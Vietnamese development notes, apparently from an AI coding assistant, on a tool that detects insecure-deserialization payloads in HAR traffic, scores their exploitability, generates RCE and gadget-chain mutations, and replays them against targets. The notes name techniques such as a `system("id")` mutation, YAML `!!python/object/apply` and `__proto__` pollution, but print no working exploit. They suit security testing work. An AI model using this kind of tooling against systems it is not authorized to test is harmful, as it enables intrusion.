**[THỬ RỒI REVERT — không giữ lại, chỉ ghi để nhớ đã thử]** Từng thêm `--from-step {2,3}` vào `debug_pipeline.py` để nối tiếp output Stage 2/3 đã lưu làm input cho stage sau (tránh chạy lại từ đầu) — fix đúng, có test pass đầy đủ (kể cả tự bắt lại 1 bug `UnboundLocalError` do chính fix gây ra rồi sửa tiếp). Nhưng user mất niềm tin vì `debug_pipeline.py` bị vá đi vá lại nhiều lần trong 1 session mà vẫn gặp lỗi mới liên tục ("tôi thực sự hoài nghi... đến lúc tôi test thì 1 đống lỗi") → yêu cầu **undo toàn bộ phần `--from-step`**, chỉ giữ lại phần scan Stage 1 (đã verify ở milestone trước). Đã revert sạch bằng 3 lần Edit ngược, confirm bằng cách chạy lại đúng lệnh gốc gây lỗi của user → crash lại y hệt traceback cũ (xác nhận gỡ sạch, không còn sót). **Không tự làm lại fix này nữa trừ khi user yêu cầu lại.**

**Schema hoá pipeline I/O bằng `typing.TypedDict`** — thêm `Utility/schemas.py` (thuần stdlib, không thêm dependency): khai báo type cho input/output của TẤT CẢ stage (`ScanVector`, `CleanedVector`, `NormalizedCandidates`, `FingerprintResult`, `ExploitResult`, `MutationVector`, `Mutation`=`MutationPayload|MutationError`, `OracleProbeResult`, `ReplayResult`=`ReplaySkipped|ReplaySuccess`, `HttpProbeSample`, `AnalyzeEntry`, `AssessEntry`). Gắn type hint thật vào 7 file: `cleanfilter.py`, `normalize.py`, `finderprint.py`, `ExploitabilityAnalysis.py`, `payloadMutation.py`, `oracle_probe.py`, `replay_request.py`. Cài `mypy` (dev-tool, không phải runtime dependency) để verify: `python -m mypy --explicit-package-bases <7 file> --ignore-missing-imports`.

**2 bug thật phát hiện qua mypy (không phải chỉ lỗi khai báo type):**
- `payloadMutation.py:44-45` (cũ) — `self.etype = exploit_result.get("exploit_type", "")` — `.get(key, default)` chỉ áp dụng default khi **key không tồn tại**, KHÔNG áp dụng khi key tồn tại nhưng giá trị là `None` (mà `exploit_type` theo schema đúng là `str | None` — xem `ExploitabilityAnalysis.py` dispatch-not-found case). Nếu `exploit_type=None` thực sự lọt qua (hiện tại chưa xảy ra trong thực tế vì mọi nơi set `probe` cũng đồng thời set `exploit_type`, nhưng không có gì đảm bảo mãi mãi đúng), `self.etype.lower()` ở `_resolve_chains()` (dòng 75) sẽ crash `AttributeError`. **Fix**: `exploit_result.get("exploit_type") or ""` — coalesce cả 2 trường hợp (thiếu key VÀ key=None) về `""`. Tương tự cho `self.probe`.
- Cùng loại bug tiềm ẩn được mypy xác nhận KHÔNG có ở 2 chỗ khác gọi `.lower()` tương tự (dòng 405, 605 cũ) — cùng nguồn `self.etype`, cùng fix chung 1 chỗ đã giải quyết hết cả 3.

**Sửa schema cho khớp thực tế runtime** (không phải sửa code, mà sửa lại chính `schemas.py` cho đúng): `MutationError.command` đổi thành optional (`total=False`) — vì `_mutate_java_urldns()`/`_php_mutation()` có case chỉ trả `{"error":..., "hint":...}` không có `"command"`. `ReplaySkipped`/`ReplaySuccess`'s `url`/`location`/`name`/`payload_type` đổi thành `str | None` — vì `main.py`'s vòng lặp `assess` gọi `replayer.replay(mutation)` **trực tiếp không lọc `"error"` trước** (khác `replay_all()` có lọc) — nếu 1 mutation là `MutationError` (thiếu url/location/name), `.replay()` vẫn phải xử lý được (đã có sẵn guard `if not url or not location or not name: return skip`), nhưng kiểu dữ liệu khai báo trước đó (`str`) không phản ánh đúng khả năng `None` này.

**Verify**: `mypy` sạch cả 8 file (bao gồm `schemas.py`). Unit test `TestCase/test_exploitability_analysis.py` 15/15 vẫn pass. Full benchmark `comprehensive.har`: 19/19 endpoint, 27 dòng `exploitable=True` — y hệt trước khi thêm type hint, không regression hành vi runtime nào (chỉ 2 chỗ sửa logic thật ở trên, cả 2 đều là "phòng hờ cho case chưa xảy ra", không đổi kết quả hiện tại). `result1.json`/`result2.json` không đổi.

**Output tự động theo ngày + timestamp** — `Output/save_output.py` thêm `default_output_path(phase)`: nếu không truyền `-o`, tự tạo `results/<DDMMYYYY>/<phase>_<HHMMSS>.json` (tự tạo folder ngày nếu chưa có). `main.py` bỏ điều kiện `if args.output:` cũ (trước đây không truyền `-o` thì KHÔNG lưu gì cả) — giờ luôn lưu, chỉ khác tên/đường dẫn. Nếu user tự truyền `-o`, giữ nguyên đường dẫn đó (không tự ý nhét vào folder ngày). `save_output_file_type()` cũng tự `os.makedirs()` thư mục cha nếu thiếu, tránh crash khi path không tồn tại sẵn.

**Đã bỏ hết comment/docstring** trong 9 file theo yêu cầu (`ExploitabilityAnalysis.py`, `cleanfilter.py`, `payloadMutation.py`, `Utility/signatures.py`, `debug_pipeline.py`, `Replay/oracle_probe.py`, `Replay/replay_request.py`, `main.py`, `tool_config.py` — `normalize.py` đã làm ở lượt trước) — chỉ giữ lại code, không đổi logic. Verify bằng regression `test.har` + `result1.json` + bộ test gzip-wrapping (Ruby/.NET/NodeJS/Wrapper) — kết quả giống hệt trước.

## 0. File test benchmark chuẩn — `TestCase/comprehensive.har`

Đã xóa toàn bộ file test cũ (`test.har`, `example_multivalue_header.har`, `stress_test.har` + các JSON output tương ứng) — thay bằng **1 file benchmark chuẩn duy nhất**, giữ lại `results/result1.json`/`result2.json` (data lab thật, không đụng vào).

`TestCase/generate_comprehensive_har.py` — script sinh file HAR (giữ lại trong repo để tái tạo/mở rộng sau này, không phải blob JSON tĩnh khó sửa). Chạy `python TestCase/generate_comprehensive_har.py` để tạo lại `TestCase/comprehensive.har`.

`TestCase/comprehensive.har` — mô phỏng traffic thật của 1 web app (e-commerce + dashboard): **642 request** (620 nhiễu thực tế: browse/search/cart/analytics/static asset/WebSocket/IP-spoofing/JWT hợp lệ... + 22 payload nguy hiểm rải ngẫu nhiên, đủ 8 loại serialize + mọi edge case đã phát hiện trong session: multi-cookie đầu/giữa/cuối, gzip-wrap, short base64, Content-Disposition, Content-Type signal).

Cách dùng:
```
python main.py scan --har TestCase/comprehensive.har -o results/comprehensive_scan.json
python debug_pipeline.py -i results/comprehensive_scan.json --step 2   # PostFilter
python debug_pipeline.py -i results/comprehensive_scan.json --step 4   # Normalize
python debug_pipeline.py -i results/comprehensive_scan.json --step 5   # Fingerprint
```

**Fix độ thực tế của file benchmark** (user chỉ ra: HAR thật luôn có cookie+header+query+cache cùng lúc trên 1 request, file cũ mỗi malicious entry chỉ set đúng 1 dimension — dễ hơn thực tế, không lẫn payload vào noise thật của cùng request). Sửa `entry()` trong `generate_comprehensive_har.py`:
- Mọi request giờ luôn có baseline cookies (`_ga`/`cart_id`/`locale`) + full browser headers (Accept/UA/sec-fetch/...) merge với giá trị explicit truyền vào (explicit thắng theo từng key, các key baseline khác vẫn giữ).
- `cookies` dict và raw header `Cookie` giờ luôn khớp nhau (parse 2 chiều) — giống Chrome thật (cookie xuất hiện đồng thời ở `cookies[]` VÀ raw `Cookie` header, không phải chỉ 1 trong 2).
- Response giờ có `cookies`/`headers` (Content-Type, Server, X-Powered-By, Cache-Control), `cache.afterRequest` (eTag/hitCount, ~35% request), `content.text` — trước đây toàn để trống `{}`/`[]`.
- Verify: quét lại `comprehensive.har` (9859 vector, tăng từ noise dày hơn) + `debug_pipeline --step 5`, tất cả nhóm định dạng cũ (PHP/Java/Ruby/DotNet/Wrapper) vẫn detect đúng, các case biết-lỗi (`raw_body`, base64-padding) vẫn miss đúng như cũ — không regression. Regression `result1.json` (data lab thật) không đổi.

**Kết quả benchmark lần chạy đầu (2026-09-12), dùng cho RQ1/RQ2 — có số liệu thật:**
- Hiệu năng: 642 request → 5935 vector trong 0.94s; PostFilter 0.38s; Normalize 0.36s; Fingerprint 0.40s — không có vấn đề hiệu năng ở quy mô ~6000 vector.
- Giảm nhiễu: PostFilter giữ 39/5935 vector (99.34% loại bỏ).
- **False positive signal**: 27 header `Authorization` chứa JWT hợp lệ (benign) bị PostFilter giữ lại (do JWT trông giống base64 dài), nhưng `Fingerprint` đúng đắn phân loại `Unknown` — không sai lệch kết quả cuối, chỉ tốn thêm xử lý downstream.
- **[ĐÃ CẬP NHẬT — cả 2 bug bên dưới đã fix]** Số liệu ban đầu (trước fix): 8/22 payload mất — 6/22 do bug base64-padding-modulo (`signatures.py`), 2-3/22 do bug `raw_body` whitelist (`postfiltered.py`). Sau khi fix cả 2 (xem 2 checkbox `[x]` bên dưới): **19/19 (100%) endpoint độc hại trong `comprehensive.har` detect đúng, không còn false negative nào đã biết ở tầng static signature**. Regression `result1.json`/`result2.json` không đổi.

**`debug_pipeline.py`** (project root) — tool debug riêng, xem output tại đúng 1 bước trung gian thay vì phải chạy hết `analyze` rồi mới biết. Tái sử dụng y hệt class `main.py` dùng (không viết lại logic riêng, tránh lệch nhau như đã gặp với `TEST_COMMANDS`/signature trước đây):
```
python debug_pipeline.py -i results/scan.json --step 2   # PostFilter
python debug_pipeline.py -i results/scan.json --step 3   # + CleanFilter
python debug_pipeline.py -i results/scan.json --step 4   # + Normalize
python debug_pipeline.py -i results/scan.json --step 5   # + Fingerprint
python debug_pipeline.py -i results/scan.json --step 6   # + ExploitabilityAnalysis
python debug_pipeline.py -i results/scan.json --step 7   # + PayloadMutation
```
`-o <file>` để lưu output ra JSON thay vì chỉ in console.

**Bug phát hiện qua `/code-review` sau khi fix `raw_body` ở PostFilter — CHƯA có test benchmark tự động cover, phát hiện bằng đọc code:**
- [x] `Replay/replay_request.py`'s `_send()` (dòng 76-94) có nhánh riêng cho `cookie`/`header`/`query,url_param`/`body,form_body`, nhưng **thiếu nhánh `raw_body`** — `body` luôn ở lại `None` với vector `location=="raw_body"`, bất kể `value` là gì. Hậu quả: request baseline và mutated giống hệt nhau (cả 2 đều không có body) → `_compare()` không bao giờ thấy khác biệt → `likely_vulnerable` luôn `False`. Bug này vô hiệu hoá ngầm chính fix `raw_body` ở `postfiltered.py` (dòng trên) — 3 payload Java/NodeJS/YAML giờ pass được Stage 2-7 (`analyze`) nhưng bị chặn câm lặng ở Stage 8 (`assess`/replay), không bao giờ lên được `Confirmed`. **Fix**: thêm nhánh `elif location == "raw_body": body = value.encode("utf-8", errors="replace")` — set nguyên văn `value` làm body (khác `body`/`form_body` vốn urlencode `{name: value}`, vì `raw_body` đại diện cho TOÀN BỘ nội dung body, không phải 1 field riêng). Verify: dựng `Request` object thủ công xác nhận `req.data` chứa đúng payload thay vì `None`. Không verify được qua network thật (không có target sống trong benchmark) — cần verify thêm khi có target lab thật dùng raw JSON/YAML body.
- [x] `Analyze/finderprint.py`'s `_detect_php()` (dòng 108-115) — regex `s:(\d+):"([^"]*)"` để kiểm tra length-declaration của PHP serialize string field parse SAI khi giá trị bên trong chứa dấu `"`. PHP serialize KHÔNG escape dấu quote trong string value (chỉ dựa vào length prefix `N` để biết dừng ở đâu), nhưng regex `[^"]*` lại dừng ở dấu `"` ĐẦU TIÊN gặp phải — cắt captured group ngắn hơn thực tế → `len(group) != declared` → trừ điểm sai cho payload PHP hợp lệ 100%. Thực tế xảy ra khi: field text tự do (bio/note/display name chứa `"`), JSON-lồng-trong-string (session lưu JSON dạng string bên trong object serialize khác — rất phổ biến), hoặc chính payload RCE do tool tự mutate ra (lệnh shell `system("id")` chứa quote). Đo được mức độ nghiêm trọng thật: với payload chỉ có 1 field string (`s:7:""admin"";`), bug làm `score` rơi về 0 → bị loại khỏi `matched` hoàn toàn → **`type` báo `Unknown`, mất detection 100%** (không chỉ giảm confidence như đánh giá ban đầu). Với object nhiều field, thường né được vì field ĐẦU TIÊN regex bắt trúng là TÊN field (ít khi chứa quote) nên `break` sớm trước khi chạm field giá trị lỗi — đây là lý do benchmark hiện tại (toàn field đơn giản, không quote) chưa từng lộ bug này. **Fix**: đổi từ regex-capture-theo-quote sang parse đúng theo length khai báo — tìm vị trí `s:N:"` rồi lấy đúng N ký tự tiếp theo bằng slicing, chỉ verify ký tự ngay sau đó có phải `"` không (giống cách PHP `unserialize()` thật sự đọc). Verify bằng 4 case: field đơn không quote (không đổi, vẫn `PHP High/Medium`), field đơn CÓ quote (từ `Unknown` → `PHP Medium`, đúng), object nhiều field có quote (không đổi, vẫn `PHP High`), JSON-lồng-trong-string (`PHP Medium`, đúng). Full benchmark `comprehensive.har` vẫn 19/19 — không regression. `result1.json`/`result2.json` không đổi.
- [x] `Analyze/finderprint.py`'s `_detect_php()` dòng 89-90 (cũ) — guard `if len(raw) < 8: return score=0` chặn tuyệt đối mọi primitive PHP serialize hợp lệ nhưng ngắn hơn 8 ký tự: `b:0;`/`b:1;` (4 ký tự), `i:5;` (4 ký tự), `d:3.0;` (6 ký tự) — dù các pattern trong `PHP_WEAK` (`Utility/signatures.py`) hoàn toàn có thể match đúng, hàm return sớm trước khi kịp chạy bất kỳ check nào. Thực tế: 1 field boolean/integer bị tách riêng (VD cookie `is_admin` chỉ chứa đúng `b:1;`, không nằm trong object cha) sẽ luôn bị báo `Unknown` — trớ trêu là chính mutation `flip_boolean` của tool cũng nhắm đúng dạng field `b:0;`/`b:1;` này. **Fix**: bỏ hẳn guard — không cần thay bằng ngưỡng khác vì các regex pattern ngắn nhất (`PHP_WEAK`) đã tự nhiên không match được chuỗi quá ngắn (guard vốn dư thừa với `PHP_STRONG`/`PHP_MEDIUM` vì 2 loại đó cần nhiều hơn 8 ký tự để match, chỉ có tác dụng phụ chặn nhầm `PHP_WEAK`). Verify: `b:1;`/`b:0;`/`i:5;`/`d:3.0;` đứng riêng giờ đều detect đúng `PHP`; noise thật không phải PHP (`admin: true`, JSON `{"admin": true}`) vẫn đúng `Unknown` — không tăng false positive. Full benchmark `comprehensive.har`: Unknown count không đổi (96), 19/19 vẫn detect đúng — không regression. `result1.json`/`result2.json` không đổi. Tiện thể dọn `import base64` không dùng ở đầu file (dead import).
- [x] `Analyze/ExploitabilityAnalysis.py` — `_analyze_java()`/`_analyze_ruby()` tự viết lại check magic bytes RIÊNG (không dùng `Utility/signatures.py` như `finderprint.py` đã làm), và check đó YẾU/SAI hơn hẳn check của Fingerprint (Stage 5): `_analyze_java()` chỉ tìm chuỗi text `"ro0ab"`/`"ro0a"` (dạng base64), `_analyze_ruby()` chỉ tìm literal string `"\\x04\\x08"` (chuỗi ký tự escape, KHÔNG PHẢI byte thật `\x04\x08`) hoặc prefix `"BAh"`. Vì `normalize.py` ưu tiên trả về candidate là BYTE THÔ đã giải nén (không phải dạng base64/escape text), nên khi Fingerprint đã confirm đúng `type="Java"`/`"Ruby"`, 2 hàm này vẫn tự chạy lại check của riêng mình trên `fingerprint_result["value"]` và THẤT BẠI — trả `exploitable=False`, không có `exploit_type`, không bao giờ tới được `PayloadMutation` (Stage 7). Đo được bằng `main.py analyze` thật trên `comprehensive.har`: `/api/session-gzip` (Java-gzip), `/dashboard` (Ruby plain), `/dashboard-gzip` (Ruby-gzip) đều báo `exploitable=False` dù Fingerprint đã đúng type — tức chính các case gzip-wrap vừa fix ở Stage 5 (bug base64-padding) vẫn bị mất ở Stage 6, coi như vẫn "mất" dù đã fix tầng dưới. Ruby còn tệ hơn Java: kể cả case KHÔNG gzip cũng fail (vì candidate ưu tiên luôn là byte thô, không phải text `"BAh..."`). **Fix**: bỏ hẳn 2 gate `has_magic`/`has_marshal` — tin tưởng `fingerprint_result["type"]` đã được Stage 5 confirm đúng (đó là lý do dispatch chỉ gọi `_analyze_java`/`_analyze_ruby` khi type khớp), giữ nguyên baseline score (`score=2` cho Java, `score=3` cho Ruby) làm điểm khởi đầu thay vì làm điều kiện chặn. **Bug phụ cùng gốc**: `_analyze_php()` cũng có gate tương tự — bắt buộc `o:\d+:` (object wrapper) mới chạy tiếp, dù Fingerprint còn nhận diện cả PHP array thuần (`a:N:{...}`) và field đơn lẻ (`s:N:"...";`) là PHP. Field `role`/`admin` bị tách riêng không có `O:` bọc ngoài sẽ luôn báo "Not a PHP object", bỏ lỡ privilege escalation thật. Fix tương tự: bỏ gate, giữ `score=1` baseline. Verify: `/api/session-gzip`, `/dashboard`, `/dashboard-gzip` giờ đều `exploitable=True` đúng; case PHP array thuần/field rời không `O:` giờ cũng detect đúng `Privilege Escalation`. Full benchmark 19/19 vẫn giữ, không regression. `result1.json`/`result2.json` không đổi. Gốc rễ: `ExploitabilityAnalysis.py` chưa được đưa vào `Utility/signatures.py` như 3 file kia — nên vẫn giữ logic detect trùng lặp, yếu hơn, lệch pha với Fingerprint.
- [x] `Analyze/ExploitabilityAnalysis.py`'s `_analyze_dotnet()` — cùng gốc rễ với bug trên (`_analyze_java`/`_analyze_ruby`/`_analyze_php`), phát hiện qua review lại sau khi fix 3 bug kia. Fingerprint (Stage 5) nhận diện DotNet qua 3 nguồn: `DOTNET_VIEWSTATE` (`^/wEy`/`^/wEx`/`^/wEP`), `DOTNET_PATTERNS` (SOAP envelope, `System.Runtime.Serialization`, `__type.*System.`, `"@class":"..."`, `TypeObject.*mscorlib`, + 4 formatter keyword), và literal `"$type"`. Nhưng `_analyze_dotnet()` chỉ check lại ĐÚNG 3/9 pattern đó (ViewState prefix qua regex `/we[xyp]` — khớp đúng 3 ký tự y/x/P của `DOTNET_VIEWSTATE` nên phần này AN TOÀN, không lệch; `"$type"`; và 4 formatter keyword) — **hoàn toàn thiếu** 5 pattern còn lại (SOAP envelope, `System.Runtime.Serialization`, `__type.*System.`, `"@class"`, `TypeObject.*mscorlib`). Payload nào chỉ match qua 1 trong 5 pattern thiếu đó sẽ khiến Fingerprint báo đúng `DotNet` nhưng Stage 6 rơi vào nhánh cuối `if not exploit_type: return False, None, 0, "none", "No dangerous .NET pattern detected"` — mất hoàn toàn `exploit_type`/`probe`, không bao giờ tới `PayloadMutation`. Verify bằng 3 case dựng tay (SOAP envelope, `__type":"System.Data.DataSet"`, `TypeObject="mscorlib"` trong XML) — cả 3 đều Fingerprint đúng `DotNet` nhưng Stage 6 trả `exploitable=False, exploit_type=None` trước khi fix. **Fix**: thêm baseline `score=2` (giống Java/Ruby/PHP — tin tưởng Fingerprint đã confirm) và thêm fallback `exploit_type="DotNet Deserialization — Unknown Pattern"`, `probe="dotnet_deser"` khi không match được ViewState/$type/formatter cụ thể nào (giống cách `_analyze_java()` đã có sẵn fallback "Unknown Gadget") — `probe="dotnet_deser"` đã có sẵn handler ở `payloadMutation.py` dòng 63 (`_mutate_dotnet_viewstate()`), không cần sửa thêm gì ở Stage 7. Verify: cả 3 case dựng tay giờ có `exploit_type`/`probe` đầy đủ (dù `exploitable` vẫn `False` vì score=2 < ngưỡng 5 — đúng, bằng chứng còn yếu/chung chung). Full benchmark `comprehensive.har`: 2 case DotNet có sẵn (`/Default.aspx`, `/api/state`, đều match ViewState) không đổi, vẫn `exploitable=True` — không regression. `result1.json`/`result2.json` không đổi.
- [x] `Analyze/ExploitabilityAnalysis.py`'s `_analyze_nodejs()` — cùng bug pattern, phát hiện khi recheck lại toàn file. `_detect_nodejs()` ở `finderprint.py` (Stage 5) dùng `NODEJS_PATTERNS` (`Utility/signatures.py`, gồm `_proto_\s*:`, `"__proto__"\s*:`, `"constructor"\s*:\s*\{`, `'node-serialize'`, `"rce":"_\$\$ND_FUNC\$\$_`, `_\$\$ND_FUNC\$\$_function`) CỘNG với `is_nodejs_prototype_pollution()` dùng chung. `_analyze_nodejs()` chỉ check `"_$$nd_func$$_"`, `"__proto__"`, và `"constructor" and "prototype"` (2 check cuối thực chất khớp đúng logic `is_nodejs_prototype_pollution()`, không lệch) — nhưng **thiếu hẳn** pattern `"constructor":\s*\{` độc lập (không cần có chữ "prototype" đi kèm) và literal `'node-serialize'`. Payload nào chỉ match qua 1 trong 2 pattern thiếu đó (VD JSON `{"constructor": {...}}` không nhắc gì tới "prototype") khiến Fingerprint báo đúng `NodeJS` nhưng Stage 6 trả `exploitable=False, exploit_type=None`. Verify bằng 2 case dựng tay (`{"constructor": {...}}` không "prototype"; text chứa literal "node-serialize") — cả 2 đều Fingerprint đúng `NodeJS` nhưng Stage 6 mất trước khi fix. **Fix**: cùng pattern — thêm baseline `score=2`, thêm fallback `exploit_type="NodeJS Deserialization — Unknown Pattern"`, `probe="proto_pollution"` (đã có handler sẵn ở `payloadMutation.py` dòng 59). Verify: 2 case dựng tay giờ có `exploit_type`/`probe` đầy đủ; benchmark thật (`/api/update-profile`, `/api/update-profile-hdr`) không đổi, vẫn `exploitable=True`; `result1.json`/`result2.json` không đổi — không regression.
- **Đã recheck toàn bộ 8 sub-detector lần 2** sau khi fix DotNet/NodeJS: `_analyze_pickle()` không có gate chặn (luôn `return True`, hợp lý vì Fingerprint type="Python Pickle" đã đủ tin cậy). `_analyze_yaml()` có nhánh `return False, None,...` khi không match `YAML_RISK_MAP` (5 pattern, khớp 100% với `YAML_SUBTYPES` ở `finderprint.py`) — nhưng đây KHÔNG phải bug giống Java/Ruby/PHP/DotNet/NodeJS: Fingerprint có thể gán type="YAML" chỉ nhờ tín hiệu yếu (`YAML_MEDIUM`/`YAML_WEAK` — VD `%YAML 1.1` version header, hay tag `!<...>` chung chung) mà KHÔNG có tag nguy hiểm cụ thể nào — trường hợp này thật sự KHÔNG có bề mặt khai thác (không phải mất detection, mà là không có gì để khai thác thật), nên trả `exploitable=False` là đúng, không cần fallback. `_analyze_wrapper()` dùng `WRAPPER_RISK_MAP` khớp đầy đủ `WRAPPER_DANGEROUS + WRAPPER_MODERATE` ở `signatures.py` — không thiếu pattern nào.

**RECHECK cuối cùng — probe/mutation handler consistency**: audit toàn bộ 17 giá trị `probe` (`suggested_probe`) mà `ExploitabilityAnalysis.py` có thể sinh ra, đối chiếu với `payloadMutation.py`'s dispatch (dòng 47-69) — tất cả đều có handler tương ứng, không probe nào "mồ côi" (bị mất kết nối sang Stage 7 một cách âm thầm).

**Unit test mới**: `TestCase/test_exploitability_analysis.py` — dùng `unittest` (thư viện chuẩn, không thêm dependency, giữ đúng cam kết README). 3 nhóm:
1. `TestHappyPathPerFormat` — 1 test/format (8 format + case Unknown), verify đúng `exploitable`/`suggested_probe`.
2. `TestRegressionBugsFixedThisSession` — 5 test tái hiện đúng 5 bug đã fix (Java-gzip, Ruby-plain, PHP-không-object-wrapper, DotNet-qua-DOTNET_PATTERNS, NodeJS-constructor-không-prototype) — nếu ai vô tình thêm lại gate kiểu `has_magic`/`o:\d+:` thì test đỏ ngay, không cần chờ tới benchmark mới phát hiện.
3. `TestProbeMutationHandlerConsistency` — tự động hoá đúng audit RECHECK ở trên (gọi `PayloadMutation.mutate()` thật với từng probe, assert không crash và trả về list) — bắt được ngay bug Unicode dưới đây.

**Bug phát hiện qua unit test (không phải qua benchmark)**: `Analyze/payloadMutation.py` dòng 153 — `print(f"[*] Trying {chain} → {cmd}")` dùng ký tự Unicode `→` (mũi tên), crash `UnicodeEncodeError` khi stdout không phải UTF-8 (mặc định console Windows dùng `cp1252`). `main.py` có wrapper UTF-8 stdout ở đầu file nên chạy qua CLI không sao, nhưng bất kỳ ai `import PayloadMutation` trực tiếp (unit test, script khác, hoặc dùng tool như 1 thư viện) đều crash ngay khi gọi `mutate()` với `probe="ysoserial"`. **Fix**: đổi `→` thành ASCII `->`. Verify: `python -m unittest TestCase.test_exploitability_analysis` — 15/15 test pass.

**Overall test** (`main.py scan` + `analyze` full trên `comprehensive.har` + regression `result1.json`/`result2.json`): 19/19 endpoint benchmark vẫn detect đúng, 27 dòng `exploitable=True`, không có gì bất thường so với các lần chạy trước trong session — các dòng `mutations=0` ở gadget-chain/phar/SSRF là do máy không cài `phpggc`/`ysoserial`/`gopherus`, đã biết từ đầu session, fail gracefully đúng thiết kế, không phải regression.

**Đã phát hiện qua stress test/benchmark, CHƯA FIX (để dành theo từng bước):**
- [x] `har_loader.py` tạo `location: "raw_body"` cho POST body dạng JSON/YAML/XML/raw text (khi HAR có `postData.text` thay vì `postData.params` — không tách được field riêng), nhưng `postfiltered.py`'s whitelist (dòng 63) chỉ có `["cookie", "body", "header", "query", "form_body", "url_param"]`, thiếu `"raw_body"` → **mọi raw POST body bị vứt 100% ngay Stage 2**, trước khi kịp chạy `_look_maybe_suspicious()`. Đo được: 3/22 payload benchmark mất vì lý do này (Java raw_body qua `JMSInvokerServlet`, NodeJS `__proto__` qua `update-profile`, YAML `!!python/object/apply` qua `config`). **Fix**: thêm `"raw_body"` vào whitelist. Verify bằng `comprehensive.har`: cả 3 case detect đúng (Java/NodeJS/YAML) — **19/19 (100%) endpoint độc hại trong benchmark giờ detect đúng, không còn false negative nào đã biết**. Không regression với `result1.json`/`result2.json`.
- [x] `Utility/signatures.py:206` (dùng chung bởi `postfiltered.py` VÀ `normalize.py._is_serialized_payload`) — check base64-shape xóa padding `=` TRƯỚC rồi mới check `len % 4 == 0`. Toán học base64: độ dài CÓ padding luôn chia hết 4 (0/1/2 dấu `=` tương ứng byte gốc mod 3 = 0/2/1), nhưng SAU khi xóa padding thì phần dư lệch đi (dư 2 hoặc 3, không phải 0) — check cũ chỉ tình cờ đúng khi base64 KHÔNG có padding. Chứng minh bằng payload thật (Java-gzip): độ dài có padding 172 (172%4=0 ✓, hợp lệ) nhưng sau `.rstrip('=')` còn 170 (170%4=2 ✗) → bug trả `False` cho base64 hợp lệ 100%. Hậu quả nặng nhất ở `postfiltered.py` vì nó dùng kết quả này làm **cổng chặn cứng** (Stage 2) — vector bị vứt vĩnh viễn, không có "lớp giải mã sau" nào cứu lại như trong BFS của `normalize.py` (ở đó decode luôn chạy vô điều kiện, không phụ thuộc check này, nên bug không gây hậu quả tại normalize.py). **Fix**: không đoán qua modulo nữa — tính lại padding đúng cách (`padded = value_clean + '=' * (-len(value_clean) % 4)`, giống `normalize.py` dòng 54-56 đã làm đúng từ trước) rồi thử `base64.b64decode(padded, validate=True)` thật, chỉ trả `True` nếu decode thành công. Verify bằng `comprehensive.har`: cả 6/22 case gzip-wrap trước đây mất (Java-gzip, Ruby-gzip, Wrapper-gzip, NodeJS-gzip-qua-header, YAML-gzip-qua-header, Pickle) giờ detect đúng 100% (Java/Ruby/Wrapper/NodeJS/YAML/Python Pickle) — không regression với `result1.json`/`result2.json` (data lab thật). Chỉ còn 3 case raw_body (`JMSInvokerServlet`, `update-profile`, `config`) miss — thuộc bug khác (`raw_body` whitelist, dòng dưới), chưa fix.
- [x] `cleanfilter.py`'s `PREFIX_PATTERNS[2]` (`^[\w-]{1,32}\s*=\s*`) quá tham lam — base64 ngắn (≤33 ký tự, kết thúc đúng 1 dấu `=` padding) không khớp pattern cụ thể nào trước, bị hiểu nhầm toàn bộ là `tên_biến=` và xóa sạch thành chuỗi rỗng. Chỉ xảy ra khi value TRẦN (không phải multi-cookie header) có đúng 1 dấu `=` ở cuối và phần trước ≤32 ký tự word-char. **Đã fix**: `_clean()` nhận thêm `location`/`name`, chỉ chạy vòng lặp `PREFIX_PATTERNS` khi `location=="header"` và `name` là `"cookie"`/`"set-cookie"` (2 chỗ duy nhất value thật sự có thể chứa `tên=` bên trong) — các location khác value đã trần từ đầu (HAR tách sẵn tên/giá trị), giữ nguyên không bóc gì. Bonus không ngờ: case Content-Disposition (đã ghi nhận trước đây là hạn chế) giờ cũng detect đúng `PHP High` luôn, vì không còn bị `PREFIX_PATTERNS` can thiệp sai vào `form-data; name=...`. Verify bằng `comprehensive.har`: PHP tăng 4→5 (Unknown giảm 27→26), 2 bug còn lại (`raw_body`, base64-padding) không đổi (đúng dự kiến, khác file) — không regression
- [x] `Analyze/normalize.py`'s `_generate_decodes()` dùng `.decode('utf-8', errors='ignore')` cho dữ liệu binary tùy ý (Java serialize, Pickle...) — byte không hợp lệ UTF-8 đứng một mình (ví dụ `\xac\xed` — 2 byte đầu magic Java) bị **xóa mất hẳn**, không phải hiển thị sai. Ảnh hưởng: Java payload sau khi giải nén gzip mất đúng 2 byte magic đầu, không detect được (`Unknown/Low`) dù PHP/Ruby/NodeJS/.NET/Wrapper cùng kịch bản đều decode đúng. **Đã fix** (từ trước, note quên tick): cả 3 chỗ decode trong `_generate_decodes()` (dòng 62/69/79) đã đổi sang `.decode('latin-1')` — ánh xạ 1-byte-1-ký-tự không mất dữ liệu, khác `utf-8` vốn xóa byte không hợp lệ đứng một mình. Verify: Java-gzip/plain/short trong `comprehensive.har` đều detect đúng `Java` (xem kết quả benchmark mới nhất)

## 1. Việc kỹ thuật còn thiếu

**`Analyze/normalize.py` — review + fix (session mới):**
- [x] `_is_serialized_payload()` chỉ có check Java/PHP/YAML/Pickle-keyword, thiếu Ruby/.NET/NodeJS/Wrapper → payload các loại này giải nén đúng qua gzip+base64 nhưng bị âm thầm vứt bỏ (không nhận ra là "có ý nghĩa"), trả về lại chuỗi gzip+base64 gốc chưa giải nén, `Fingerprint` không tự gzip-decompress được nên báo `Unknown/Low` — false negative đã verify bằng test thật. Fix: đổi sang gọi `signatures.looks_like_serialized()` (đã bao phủ đủ 8 loại)
- [x] `signatures.looks_like_serialized()` bản thân cũng thiếu check byte thô (chỉ có dạng chữ escape `\x04\x08` và base64 `BAh...`, không có byte điều khiển thật) — Ruby Marshal sau khi giải nén gzip ra byte thô không match được. Fix: thêm check `JAVA_MAGIC_BYTES + PICKLE_MAGIC_BYTES + RUBY_MAGIC_BYTES` trên `value.encode('utf-8', errors='ignore')`
- [x] `_serialized_score()` cũng chỉ có điểm cộng Java/PHP — candidate .NET đã giải nén đúng bị **hòa điểm** với chuỗi gzip+base64 chưa giải nén (cả 2 đều -3 vì cùng trông giống base64 thuần túy), tiebreaker chọn nhầm. Fix: thêm điểm cộng cho DOTNET_VIEWSTATE/DOTNET_PATTERNS/RUBY_PATTERNS/RUBY_MAGIC_BYTES/NODEJS_PATTERNS/WRAPPER_DANGEROUS (tái dùng `signatures.py`)
- Verify: cả 4 loại (Ruby/NodeJS/.NET/Wrapper) qua gzip+base64 giờ decode và detect đúng; PHP/Java-base64-đơn-lớp không regression (trừ bug byte-loss riêng ở trên, không liên quan 3 fix này)
